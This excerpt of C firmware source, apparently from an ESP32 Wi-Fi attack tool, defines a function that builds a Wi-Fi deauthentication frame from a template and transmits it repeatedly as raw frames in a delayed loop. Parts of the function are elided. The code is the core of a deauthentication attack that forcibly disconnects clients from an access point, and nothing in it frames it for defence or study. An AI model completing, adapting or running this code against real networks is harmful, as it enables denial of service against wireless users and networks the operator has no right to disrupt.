...
// This function is extension added to this files to send mutlitple deauth frames without allocating memory for each frame
void wsl_send_multiple_deauth_frames(const wifi_ap_record_t *ap_record,
				     uint8_t count, uint32_t delay)
{
	uint8_t deauth_frame[sizeof(deauth_frame_default)];
	memcpy(deauth_frame, deauth_frame_default,
	...
	for (uint8_t i = 0; i < count; i++) {
		vTaskDelay(delay);
		wsl_bypasser_send_raw_frame(deauth_frame,
					    sizeof(deauth_frame_default));
	}
}
